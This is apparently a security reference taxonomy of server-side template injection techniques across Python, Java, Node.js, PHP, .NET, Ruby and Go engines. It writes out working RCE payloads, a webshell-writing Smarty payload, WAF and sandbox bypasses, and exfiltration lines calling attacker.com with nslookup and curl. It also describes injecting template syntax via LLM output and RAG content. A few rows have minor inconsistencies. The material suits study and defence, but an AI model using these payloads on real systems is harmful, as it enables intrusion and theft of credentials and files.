# Server-Side Template Injection (SSTI) Mutation Taxonomy

> **Scope**: All structural mutation types that cause user-supplied data to be evaluated as template code by a server-side rendering engine, leading to information disclosure, sandbox escape, or remote code execution. Out of scope: client-side template injection (AngularJS, Vue.js DOM-side), pure XSS without server-side evaluation, and LLM prompt injection (referenced in §12 as an emerging analogue but structurally distinct).
>
> **Target size**: 12 top-level categories, ~65 subtypes.

---

## Classification Structure

This taxonomy organizes SSTI mutations along three axes. **Axis 1 (Injection Surface)** is the primary axis: it defines where user input enters the template pipeline and what structural component is being mutated. **Axis 2 (Bypass Mechanism)** is cross-cutting: it describes the specific technique used to circumvent input validation, sandboxing, or rendering restrictions. **Axis 3 (Exploitation Scenario)** is the scenario axis: it maps each category to the real-world architectural deployment that makes the mutation exploitable.

The root cause of every SSTI variant is a single architectural failure: the application passes untrusted data as *template source code* rather than as *template parameters*. This conflation of data and code is structurally analogous to SQL injection — and like SQLi, the mutations below are engineering responses to the infinite ways developers re-create this conflation across different engines, contexts, and defensive layers.

The following table summarizes the cross-cutting bypass mechanisms (Axis 2) that apply across all §categories:

| Bypass Type | Description |
|-------------|-------------|
| **Rendering bypass** | Input reaches the engine's evaluation phase without sanitization |
| **Filter evasion** | Blacklist/whitelist circumvention via encoding, alternate accessors, or alternative syntax |
| **Sandbox escape** | Navigation of object graphs to reach privileged system classes despite restricted environments |
| **Context break-out** | Escaping from a code/expression context into a full template context |
| **Double evaluation** | Exploiting two-pass rendering where output of one render is fed as input to another |
| **Out-of-band extraction** | Exfiltrating results through DNS, HTTP, or timing when direct reflection is absent |

---

## §1. Expression Syntax Injection (Plain-Text Context)

The most direct form: user input is concatenated into a template string in a position where the engine treats all text as potential expressions. The engine's own delimiter syntax (`{{ }}`, `${ }`, `<%= %>`, etc.) is used as-is. This is the foundational attack class from which all others extend.

### §1-1. Direct Expression Evaluation

User-supplied data is concatenated into a render call without any positional constraint — the entire string is evaluated as a new template.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Math-probe evaluation** | `{{7*7}}` renders as `49`, confirming execution | Application reflects input through `render_template_string()` or equivalent |
| **Engine fingerprinting** | `{{7*'7'}}` yields `49` (Jinja2) or `7777777` (Twig), disambiguating engines | Multiple candidate engines active; probe responses differ |
| **Polyglot triggering** | `${{<%[%'"}}%\` causes parse errors in whichever engine is present | Unknown engine; any error response confirms SSTI |
| **Object/context dump** | `{{ self }}`, `{{ config }}`, `{{ . }}` (Go) reveal template context objects | Framework injects privileged objects into render scope |

**Example** (Jinja2/Flask):
```
GET /profile?name={{config.SECRET_KEY}} HTTP/1.1
→ Response: Hello s3cr3t_k3y_v4lu3!
```

### §1-2. String Concatenation Injection

The application constructs a template string via string concatenation, not a safe parameter call. Variants include f-strings, format strings, and `+` concatenation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Python f-string template** | `f"Hello {user_input}"` → if engine processes it: `Hello {{7*7}}` | Application uses Python f-strings as template source |
| **String format() injection** | `"Hello {}".format(user_input)` passed to render | Format string output fed directly to template engine |
| **Implicit concatenation** | Template built with `+` operator from user parts | No sanitization between string join and render call |

---

## §2. Code-Context Injection (Variable Context Break-Out)

In a code context, user input is already embedded inside a template expression (e.g., `greeting=Hello {{username}}`). The mutation goal is to break out of the variable slot and inject new template directives.

### §2-1. Statement Termination and Re-Entry

The attacker closes the existing template expression with `}}` and appends new directives after it.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Closing-brace escape** | `username}}<h1>injected</h1>{{` closes the variable slot | Engine re-evaluates the rest of the string |
| **Statement suffix injection** | `username}}{{7*7}}{{` inserts a calculation mid-template | Application doesn't strip `}}` from parameters |
| **Directive injection after close** | `username}}{%import os%}{{os.popen('id').read()}}{{` | Logic-enabled template engine (Jinja2 with `{% %}`) |

**Example** (Jinja2 code context):
```
GET /greet?username=admin}}{{config.items()}}{{
→ Returns Flask config dict alongside greeting
```

### §2-2. Double-Evaluation Exploitation

Some frameworks perform a first pass (preprocessing) that resolves expressions, then feed the result to a second rendering pass. If user input survives the first pass as a literal, it gets evaluated in the second.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Thymeleaf expression preprocessing** | `__${7*7}__` — the double-underscore delimiters trigger preprocessing before the main render | Thymeleaf used with `${...}` inline expressions; user input reflected in a template attribute |
| **Velocity double-tag injection** | Input is assigned to a Velocity variable then re-used in a second template call | Application uses `$variable` where variable content is itself user-controlled |
| **OGNL-via-Struts double evaluation** | A Struts 2 action result calls a second FreeMarker or Velocity template, making OGNL results available as template variables | Multi-layer rendering pipeline (OGNL → FreeMarker) |
| **Spring Boot Referer/header reflection** | HTTP Referer header value reflected into a Thymeleaf template with `__${...}__` preprocessing wrapping | Framework automatically places HTTP headers into template context without sanitization |

**Real-world context**: Unauthenticated SSTI in a Spring Boot 3.3.4 application was achieved via Referer header reflection using Thymeleaf's preprocessing feature, allowing `${T(java.lang.Runtime).getRuntime().exec("id")}` to yield RCE with no special encoding.

---

## §3. Python Object Graph Traversal (MRO Chain Exploitation)

Specific to Python template engines (Jinja2, Mako, Tornado). The Python runtime exposes every loaded class through the Method Resolution Order (MRO) and `__subclasses__()` APIs. From any object reachable in the template context, an attacker can navigate to privileged classes like `subprocess.Popen` or file I/O handlers.

### §3-1. MRO Root Navigation

Starting from any class-bearing object in context, traverse to `object` (the Python base class) via `__mro__` or `__base__`, then enumerate all loaded subclasses.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`__mro__` walk** | `''.__class__.__mro__[1].__subclasses__()` — accesses `object` via MRO list | Any Python object reachable in render context |
| **`__base__` shortcut** | `''.__class__.__base__.__subclasses__()` — single-step equivalent | Engine allows `__base__` attribute access |
| **Index-based class selection** | Target class (e.g., `subprocess.Popen`) found at index `N` in subclasses list | Requires environment probing; index varies across deployments |
| **Name-filtered class selection** | Loop: `{% for x in subclasses %}{% if 'warning' in x.__name__ %}` — avoids hardcoded index | Engine allows loop + conditionals (Jinja2 `{% %}` blocks) |

**Example** (Jinja2 — index-free variant):
```jinja
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen("id").read() }}
  {% endif %}
{% endfor %}
```

### §3-2. Globals and Builtins Extraction

Certain Flask/Jinja2 context objects expose `__globals__` and `__builtins__` without needing full MRO traversal.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`request.application.__globals__`** | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` | Flask `request` object in template context |
| **`get_flashed_messages.__globals__`** | Accesses Flask's flash message function to reach `__globals__` | Flask function reference reachable in Jinja2 |
| **`config.__class__` pivot** | `config.__class__.__mro__[-1].__subclasses__()` — pivots via config object class | Flask config object always in Jinja2 context |
| **`self.__init__.__globals__`** | Twig PHP: `_self.env.enableDebug()` or `getattr` chain to underlying PHP | Twig with debug mode or `_self` context exposed |

### §3-3. File Descriptor and Config Object Exploitation

Direct exploitation of objects already in context without full class traversal.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`config.from_pyfile()` abuse** | Write malicious Python to `/tmp/`, then load via `config.from_pyfile()` | File write capability exists from prior subclass abuse |
| **`config['SECRET_KEY']` disclosure** | `{{config}}` or `{{config.items()}}` dumps all Flask config values | Config object in Jinja2 context (default Flask) |
| **Environment variable enumeration** | `{{self.__dict__}}` when `config` is blocked; enumerates app state | `self` object reflected in template scope |

---

## §4. Java Object Graph Exploitation

Java template engines (FreeMarker, Velocity, Thymeleaf, Pebble, Jinjava) expose the Java reflection API. From any accessible class, `Class.forName()` or `getClass()` chains allow construction of arbitrary objects.

### §4-1. FreeMarker Built-in Exploitation

FreeMarker's `?new()` built-in instantiates any class by name from its standard library, making `freemarker.template.utility.Execute` the canonical RCE gadget.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`Execute?new()` direct** | `${"freemarker.template.utility.Execute"?new()("id")}` | FreeMarker engine without class whitelist restriction |
| **`lower_abc` string builder** | Converts integers to alphabetic chars (`1`→`a`, `2`→`b`) to build strings without using quote characters | Quote-filtering applied; FreeMarker's `lower_abc` function bypasses it |
| **ClassLoader chain** | `<#assign classloader=article.class.protectionDomain.classLoader>` → load `Execute` class dynamically | Complex sandbox; direct `?new()` blocked but ClassLoader accessible |
| **`getProtectionDomain()` file read** | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/path/to/file').toURL().openStream().readAllBytes()?join(" ")}` | Arbitrary file read without code execution; byte array rendered as space-separated integers |

**CVE reference**: CVE-2025-26865 — FreeMarker SSTI in Apache OFBiz `ecommerce` plugin allowing unauthenticated RCE.

### §4-2. Apache Velocity Exploitation

Velocity lacks `?new()` but allows variable assignment (`#set`) and Java type inspection via `$class`.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`Class.forName()` chain** | `#set($rt=$x.class.forName('java.lang.Runtime'))` followed by `$rt.getRuntime().exec('cmd')` | Velocity without ClassTool restriction; `$class` or `$x.class` accessible |
| **`#set` variable multi-step** | Build `Runtime`, `Character`, `String` objects via multiple `#set` assignments to reconstruct exec arguments | ClassTool plugin disabled; must build objects from primitives |
| **Stream-to-string output** | `$ex.waitFor()` with `#foreach($i in [1..$out.available()])` to read command output character by character | No direct string return from exec; must iterate input stream |
| **Base64 payload decode** | Velocity executes `bash -c` with a base64-decoded string to bypass command-level filters | Network filtering blocks direct shell keywords; base64 wrapping evades detection |

**CVE reference**: CVE-2024-28254 — Multi-step base64-decoded Java payload executed via Velocity in a commercial product.

### §4-3. Spring Expression Language (SpEL) Injection

SpEL is a standalone expression language used in Spring Framework annotations, `@Value`, and explicit parser calls. Structurally similar to SSTI but operates outside traditional template engines.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`T()` type operator** | `${T(java.lang.Runtime).getRuntime().exec("id")}` — `T()` invokes static methods on named classes | Spring `SpelExpressionParser` evaluating user input |
| **`SpelExpressionParser` eval sink** | Application directly calls `PARSER.parseExpression(userInput).getValue()` | Developer explicitly builds SpEL parser from user input |
| **JSP `springJspExpressionSupport` double eval** | Spring's JSP tag evaluates `${...}` expressions; if JSP page includes user data, a second SpEL evaluation may occur | Spring Framework JSP + double evaluation enabled (pre-3.0.6 default) |
| **HubSpot HubL EL injection** | HubSpot's template language processes `${...}` expressions server-side in user-configurable content | SaaS platform's user-accessible template editor lacks output encoding |

### §4-4. OGNL Injection (Struts/Confluence)

OGNL (Object-Graph Navigation Language) is used by Apache Struts 2 and Atlassian Confluence for expression evaluation. It is structurally an expression language injected into a Java object graph.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct OGNL sink** | `%{7*7}` evaluated in an OGNL context → 49; escalated to `Runtime.exec()` | Struts 2 action passes user input to OGNL evaluator |
| **Sandbox escape via `#attr` pivot** | Accessing `#attr['com.opensymphony.xwork2.ActionContext.actionInvocation'].invoke()` forces action result rendering, populating FreeMarker template model | OGNL sandbox prevents direct `Runtime` access but permits context traversal |
| **Double OGNL via Velocity/FreeMarker tags** | Struts Velocity/FreeMarker tags re-evaluate expressions; a variable assignment in OGNL becomes a template variable evaluated again | Multi-layer Struts rendering pipeline (OGNL → template tag) |
| **Authentication bypass chaining** | URL-encoded OGNL expression in path component (`/;%7B%27a%27%2B%27b%27%7D/`) bypasses URL filters, reaches OGNL evaluator | WAF/filter inspects pre-decode URL; OGNL evaluates post-decode URL |

**CVE references**: CVE-2023-22527 (Atlassian Confluence OGNL SSTI — CVSS 10.0, cryptojacking/ransomware exploitation in the wild 2024), CVE-2021-26084 (Confluence OGNL injection).

---

## §5. JavaScript/Node.js Template Engine Exploitation

Node.js template engines (Handlebars, Pug, Nunjucks, EJS, DotJS, Eta) share the JavaScript runtime. The universal exploitation pathway uses `global.process.mainModule.require('child_process')` to reach OS execution from any position in the template.

### §5-1. Universal Node.js `process` Chain

All Node.js-based engines that expose the global object can reach OS execution via the same chain, regardless of engine-specific syntax.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`process.mainModule.require`** | `global.process.mainModule.require("child_process").execSync("id").toString()` | Engine does not restrict `global` access; expression evaluation enabled |
| **`constructor` method abuse** | Nunjucks: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` | `constructor` property accessible; engine evaluates `Function` constructor |
| **`this` chain** | `{{this.constructor.constructor('return process')().mainModule.require('child_process').exec('id')}}` | `this` keyword available in render scope |

### §5-2. Pug-Specific Exploitation

Pug (formerly Jade) uses a distinct whitespace-sensitive syntax that allows multiline JavaScript execution.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unescaped code block** | `- var x = root.process` followed by execution chain | Template rendering a user-supplied Pug template string |
| **`#{}` inline expression** | `#{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}` | Inline expression context in Pug template |
| **`!{...}` unescaped output** | `!{Buffer.from('...base64...','base64').toString()}` to decode and render payloads | HTML escaping applied to `#{}`; `!{}` bypasses it |

### §5-3. EJS Injection

EJS (Embedded JavaScript) uses `<% %>` tags that execute raw JavaScript with no sandboxing.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`<% ... %>` raw execution** | `<% require('child_process').exec('id') %>` | Application passes user input as EJS template source |
| **`options.outputFunctionName` prototype pollution** | EJS option `outputFunctionName` can be set to a function name; if prototype pollution is exploitable, the function name becomes `__proto__.eof` | Prototype pollution vector + EJS `renderFile` usage |

### §5-4. Handlebars Exploitation

Handlebars restricts JavaScript access by design, but `{{#with}}` block helpers and prototype chain access provide bypass paths.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`#with` block + `constructor` escape** | `{{#with "constructor"}}{{#with split as |a|}}{{#with (a.join (lookup . "constructor"))}}` chain to reach `Function` | Handlebars without `allowProtoProperties` enabled |
| **Unsafe `eval()` wrapper** | If application passes Handlebars output to `eval()` or similar — combined SSTI → code injection | Post-render evaluation in application logic |

---

## §6. PHP Template Engine Exploitation

PHP engines (Twig, Smarty, Blade) operate within the PHP runtime. Exploitation pathways differ substantially from Python/Java due to PHP's function-level execution model.

### §6-1. Twig Exploitation

Twig's sandbox is more restrictive than Jinja2's and disables most dangerous functions by default. Exploitation requires indirect object access or version-specific features.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`_self.env` filter chain** | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` — registers PHP `exec` as a filter | Twig without sandbox; `_self` exposes the Environment object |
| **`filter` abuse** | `{{['id']|map('passthru')}}` or `{{'/etc/passwd'|file_get_contents}}` | Filter functions not restricted; user controls filter argument |
| **Twig sandbox bypass via `getattr`** | `{{attribute(object, '__toString')}}` to call methods not normally accessible | Sandbox allows `attribute()` but not direct method calls |
| **Quote-free RCE** | Using `lower` filter and integer-to-char conversion to build string payloads without quote characters | Quote-filtering in WAF; Twig lacks Python's `chr()` but string manipulation via concatenation still possible |

**CVE reference**: Ekoparty 2024 research demonstrating quote-free Twig RCE without external parameters.

### §6-2. Smarty Exploitation

Smarty exposes PHP directly via `{php}` tags in older versions (v2/v3) and retains dangerous write-file built-ins in all versions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`{php}` tag execution** | `{php}echo system('id');{/php}` — executes raw PHP | Smarty v2 or v3 with `{php}` not disabled |
| **`Smarty_Internal_Write_File::writeFile`** | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` — writes a webshell to the document root | Smarty v3/v4; static method accessible via template; web root writable |
| **`{system()}`** | `{system('ls')}` — PHP function called directly as Smarty function | Smarty configured to allow PHP function calls; deprecated config |

### §6-3. Blade Exploitation (Laravel)

Laravel's Blade engine is restrictive but supports raw PHP via `{!! !!}` and `@php` directives.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`@php` directive** | `@php system('id'); @endphp` | Application renders user-supplied Blade templates server-side |
| **`{!! !!}` unescaped echo** | `{!! system('id') !!}` | Application passes user content through `{!! !!}` instead of `{{ }}` |

---

## §7. .NET / C# Template Engine Exploitation

The .NET ecosystem surfaces SSTI through Razor (ASP.NET Core), RazorEngine (third-party), and Scriban.

### §7-1. Razor / RazorEngine Injection

Razor uses `@` as its expression delimiter and compiles C# code server-side.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`@()` expression evaluation** | `@(2+2)` → `4`; escalated to `@(System.Diagnostics.Process.Start("cmd","/c id"))` | `Razor.Parse(userInput)` or `Engine.Razor.RunCompile(userInput,...)` in application code |
| **`@{...}` code block** | `@{ var x = System.IO.File.ReadAllText("/etc/passwd"); @x }` — multiline C# block | RazorEngine without template source restrictions |
| **`System.Diagnostics.Process.Start` webshell** | C# code adds a webshell file to the server, then requests it via HTTP | Write permissions on web root; Razor evaluation confirmed |

**Example** (Razor SSTI — confirmed via `@(7*7)`):
```
POST /render HTTP/1.1
razorTpl=@{var p=new System.Diagnostics.Process();p.StartInfo.FileName="id";p.Start();}
→ Command executed server-side via compiled C#
```

### §7-2. CrushFTP VFS Sandbox Escape

CVE-2024-4040 illustrates SSTI exploited in a non-web-framework context. CrushFTP's virtual filesystem uses a template engine that allowed sandbox escape and file reads outside the VFS boundary.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **VFS sandbox escape via template** | Template expression in a filename or path parameter evaluated by CrushFTP's engine; sandbox boundary not enforced | CrushFTP before 10.7.1 / 11.1.0; authentication not required |
| **Authentication bypass chaining** | SSTI payload reads admin credential files outside VFS, enabling privilege escalation to administrator | File read payload → credential disclosure → auth bypass → RCE |

**CVE reference**: CVE-2024-4040 — CrushFTP SSTI, exploited in the wild; CVSS Critical.

---

## §8. Ruby Template Engine Exploitation

Ruby engines (ERB, Slim, Haml) execute Ruby code within template delimiters.

### §8-1. ERB (Embedded Ruby) Exploitation

ERB uses `<%= ... %>` for expression output and `<% ... %>` for code execution with no sandboxing.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`<%= ... %>` expression output** | `<%= 7*7 %>` → `49`; escalated to `<%= system("id") %>` | Application uses `ERB.new(userInput).result()` |
| **`<% ... %>` code execution** | `<% require 'open3'; Open3.popen3("id") {|i,o| puts o.read} %>` | ERB execution without output escaping |
| **`system()` / `%x{...}` shell** | `<%= %x{id} %>` or `<%= `id` %>` — backtick shell execution | ERB template evaluated in Ruby runtime |

**Example** (PortSwigger Lab pattern):
```
GET /template?name=<%= system("rm /home/carlos/morale.txt") %>
→ Command executed; server returns nil (output suppressed but command runs)
```

### §8-2. Slim / Haml Exploitation

Slim and Haml support Ruby evaluation with different delimiter conventions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Slim `#{ ... }` interpolation** | `#{ 7*7 }` → `49`; `#{ system('id') }` executes shell | User-supplied Slim template processed by renderer |
| **Haml `=` operator** | `= system('id')` on its own line evaluates Ruby expression | Haml template processing user-controlled input |

---

## §9. Go Template Engine Exploitation

Go's `text/template` and `html/template` standard packages behave differently. `text/template` has no output encoding; `html/template` escapes HTML contexts but can still be exploited via method calls on injected objects.

### §9-1. Method Call on Context Object

Go templates cannot call arbitrary functions but *can* invoke methods on objects passed as template data. If the data object exposes dangerous methods, those become directly callable.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct method invocation** | `{{ .ExecuteCmd "id" }}` — calls a method on the data struct that executes OS commands | Application passes a struct with exec-capable methods to template; struct methods are public (uppercase) |
| **Password field disclosure** | `{{ .Password }}` — renders an unexported struct field if accessed via a pointer receiver | Application passes user/admin struct with sensitive fields to template render |
| **`{{ . }}` full struct dump** | Renders the entire data struct as a string, revealing all fields | Template data struct passed without field-level filtering |

### §9-2. `text/template` vs. `html/template` Differential

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **XSS via `text/template`** | `{{"<script>alert(1)</script>"}}` renders raw HTML | Application uses `text/template` instead of `html/template` |
| **Template definition injection** | `{{define "T1"}}alert(1){{end}} {{template "T1"}}` — bypasses `html/template` encoding in named template definitions | `html/template` used but user controls template *definition* strings, not just variable values |
| **Custom `unsafeHTML` function** | Developer registers `unsafeHTML` as a template function; user-supplied value passed through it | Explicit opt-out of Go's auto-escaping via custom function |

**Note**: Golang SSTI is significantly underreported because existing fuzzers and WAF signatures target Jinja2/FreeMarker syntax patterns. Go's `{{ }}` syntax overlaps with Jinja2 but the exploitation pathway is structurally distinct — requiring application-specific method calls rather than language-level runtime traversal.

---

## §10. Injection Delivery Surface Mutations (Non-Parameter Vectors)

SSTI is commonly associated with GET/POST parameters, but the injection surface extends to any point where user-controlled data reaches a template render call.

### §10-1. Second-Order (Stored) Injection

User input is stored in a database or persistent store, then rendered by a template engine at a later point — often in an administrative view, email, PDF, or webhook retry context.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Profile field injection** | Malicious payload in `username`, `bio`, `company` field stored; rendered in admin panel or notification email | Admin/report view renders user profile data through template engine |
| **Email template injection** | Payload stored in user-controlled email subject/body field; triggered when application generates transactional emails | Email rendering uses template engine; user field concatenated into template |
| **PDF/report generation sink** | Payload stored; rendered when generating a PDF report or export using a templating library | PDF generation library (WeasyPrint, Puppeteer, JasperReports) processes template with unsanitized data |
| **Webhook retry exploitation** | Payload stored; webhook delivery retries render the stored value through a template | Asynchronous job queue renders stored template data without re-sanitizing |
| **Stored SSTI via content field** | CMS page content or wiki body contains template syntax; rendered when admin previews or publishes | CMS uses template engine for page rendering; user-submitted content not escaped |

**CVE reference**: Apache OFBiz CVE-2022-25813 — SSTI triggered via stored `Subject` field in ecommerce plugin's "Contact us" page; required party manager to list communications to activate.

### §10-2. HTTP Header and Request Metadata Injection

Template engines that reflect HTTP request metadata (headers, method, path) create injection surfaces outside traditional input parameters.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Referer header injection** | HTTP `Referer` value reflected into a template without sanitization | Framework places request headers into template context automatically |
| **User-Agent injection** | `User-Agent: {{7*7}}` reflected in an admin log view rendered by a template engine | Logging/analytics feature renders raw HTTP headers |
| **X-Forwarded-For / custom header** | `X-Forwarded-For: {{config.SECRET_KEY}}` reflected in error pages or request traces | Error page template renders request headers for debugging |
| **URL path / query string injection** | Application constructs template from URL path segments: `/hello/{{7*7}}` renders expression | Routing framework passes path segments directly into template render |
| **Cookie injection** | Session or tracking cookie value reflected into a template | Cookie value used as template variable without sanitization |

### §10-3. Indirect / Code-Context Injection Paths

The vulnerability resides one level of abstraction away — the user controls data that flows into a template helper, layout renderer, or partial, rather than into the top-level template string.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Template include parameter** | `?template=../../evil_template` — user controls template filename; path traversal selects attacker-controlled file | Application uses `render(user_specified_template)` with insufficient path validation |
| **Partial/layout injection** | User-controlled content passed to `render(body)` inside a layout; layout renders it as a template partial | Layout engine evaluates the `body` variable as raw template code |
| **i18n string injection** | Internationalization string stored per-user and rendered via template engine for localized output | Localization system uses template rendering to process translation strings |
| **Email template customization** | SaaS feature allowing users to customize email notification templates; template content stored and later rendered | Platform exposes template editor with insufficient sandboxing |

---

## §11. Sandbox Escape and Filter Bypass Mutations

Defensive measures (sandboxes, character blacklists, WAF rules) are the primary obstacles to exploitation. This category maps techniques used to overcome them, independent of the underlying engine.

### §11-1. Character and Attribute Encoding Bypasses

Input filters that block specific characters (`.`, `_`, `[`, `]`, quotes) can be circumvented via encoding schemes supported natively by the template engine's string handling.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Python hex literal encoding** | `'\x5f\x5f'` instead of `'__'` in string literals | WAF blocks literal `__`; hex escapes evaluated natively by Python |
| **`|attr()` filter accessor** | `request\|attr('__class__')` instead of `request.__class__` | WAF blocks `.` character; Jinja2's `|attr()` filter bypasses it |
| **`[]` bracket accessor** | `request['__class__']` instead of `request.__class__` | Both `.` and `|attr()` blocked; bracket notation still valid |
| **`request.args` parameter smuggling** | `{%with a=request|attr(request.args.f|format(request.args.a,...))%}` — keyword passed as URL param outside the filtered payload | Full `__class__` string blocked in template body; reconstructed from URL parameters |
| **Full hex encoding** | Entire attribute string encoded: `request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']` | WAF inspects literal strings; hex encoding evaluated at Python runtime |

**Example** (Jinja2 — blocking `.`, `_`, `[]`, `|join`):
```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
          |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
          |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
          |attr('popen')('id')|attr('read')()}}
```

### §11-2. Quote-Free Payload Construction

Many WAFs block single and double quotes. Alternative string-building methods reconstruct arbitrary strings from integer arithmetic or engine-native functions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Python `chr()` function** | `chr(111)+chr(115)` → `'os'`; combined to build module/function names | Jinja2 with quotes blocked; `chr()` available in Python builtins |
| **FreeMarker `lower_abc` function** | Converts integers to alphabetic characters; build strings char-by-char | FreeMarker with quote filtering; `lower_abc` is a built-in |
| **Twig string manipulation** | `'a'~'b'` concatenation, `'abc'|slice(0,2)` substring extraction | Twig with partial quote restriction; some engines allow single not double quotes |
| **Integer-to-char arithmetic** | Using arithmetic expressions to derive character code points, then native conversion | Universal; specific implementation varies by engine |

### §11-3. Jinja2 Sandboxed Environment Bypass

Jinja2's `SandboxedEnvironment` is the standard mitigation for SSTI. Several bypass vectors remain viable depending on how the sandbox is configured.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`is_safe_attribute` override gap** | Custom `is_safe_attribute` whitelist misses critical dunder methods | Developer attempts custom sandbox but leaves gaps |
| **Operator overloading** | Some Python operator methods (`__add__`, `__mul__`) accessible from sandboxed types | Sandbox blocks attribute access but not operator expressions |
| **Format string filter** | Jinja2 `%` operator on strings: `"os.popen('%s').read()%" % 'id'` evaluated as a format operation | Format operator accessible in sandbox; constructs callable string |

### §11-4. WAF-Level Bypass Techniques

Web Application Firewalls inspect payloads for template syntax. Bypass techniques exploit the gap between WAF inspection logic and the template engine's parser.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Whitespace injection** | Inserting spaces, tabs, or newlines inside expression delimiters: `{{ 7 * 7 }}` vs `{{7*7}}` | WAF matches exact patterns without whitespace normalization |
| **URL encoding** | `%7B%7B7*7%7D%7D` for `{{7*7}}` — decoded by server before template evaluation | WAF inspects raw URL bytes; server decodes before rendering |
| **Double URL encoding** | `%257B%257B7*7%257D%257D` — server double-decodes before rendering | Two decoding passes in request pipeline (proxy + application) |
| **Content-type switching** | Payload delivered via `multipart/form-data`, `application/json`, or `text/xml` instead of `application/x-www-form-urlencoded` | WAF inspects only specific content types |
| **Header-based payload delivery** | Payload in `X-Custom-Header`, `User-Agent`, or `Referer` when only body is inspected | WAF does not inspect all HTTP headers for template syntax |
| **Parameter pollution** | Duplicate parameter: `?name=safe&name={{7*7}}` — WAF validates first, app uses second | Multi-value parameter handling differs between WAF and framework |

---

## §12. Blind SSTI and Out-of-Band Exfiltration

When template output is not reflected in the HTTP response (e.g., PDF generation, email rendering, background jobs), exploitation requires alternative feedback channels.

### §12-1. Time-Based Detection

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`sleep()` / `time.sleep()` probe** | Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[396](['sleep','10'],...)}}` — measures response delay | No output reflection; server processes payload synchronously |
| **Velocity time delay** | `#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('sleep 10'))$ex.waitFor()` | Java-based engine; same timing principle |
| **Error-based differentiation** | Boolean-based pair: one payload evaluates correctly, one introduces a syntax error; different response sizes/codes confirm injection | Subtler timing channels unreliable; error codes more deterministic |

### §12-2. DNS-Based Out-of-Band Detection

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`nslookup` shell command** | Jinja2 MRO chain → `popen("nslookup attacker.com")` | OS execution confirmed; DNS traffic less filtered than HTTP |
| **Subdomain data exfiltration** | `popen("nslookup $(whoami).attacker.com")` — command output embedded as DNS subdomain | DNS logging on attacker server (Burp Collaborator, Interactsh, custom DNS) |
| **Java DNS trigger** | FreeMarker: `${"freemarker.template.utility.Execute"?new()("nslookup attacker.com")}` | FreeMarker engine; any Java exec primitive |
| **HTTP callback** | `popen("curl http://attacker.com/?data=$(cat /etc/passwd | base64)")` | HTTP outbound not firewalled; larger data can be exfiltrated |

### §12-3. Error-Based Extraction

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Verbose error message reflection** | Injecting invalid syntax that triggers a descriptive error message containing file paths, variable values, or stack traces | Debug mode enabled; error handler reflects raw exception message |
| **Error-based boolean** | FreeMarker: `${1/((expr)?string('1','0')?eval)}` — divide-by-zero only if expression is false | Engine supports conditional arithmetic; error message style differs for true/false |
| **Stack trace leakage** | Payload causing `NullPointerException` or `KeyError` that reveals internal class names and file paths | Unhandled exceptions propagate to HTTP response |

---

## §13. Emerging and Hybrid Mutation Surfaces (2024–2025)

### §13-1. AI-Assisted Template Generation Sinks

As LLM-powered features are embedded into web applications, new surfaces emerge where AI output is rendered through template engines without sanitization.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **LLM-generated content as template source** | AI output fed directly to `render_template_string()` without escaping; attacker influences AI output via prompt to inject template syntax | Application uses LLM to generate template code or HTML, then renders it server-side |
| **RAG context injection** | Malicious content in a RAG knowledge base includes template expressions; when retrieved and rendered in a template, they evaluate | RAG system retrieves untrusted external content; retrieved text used in template context |
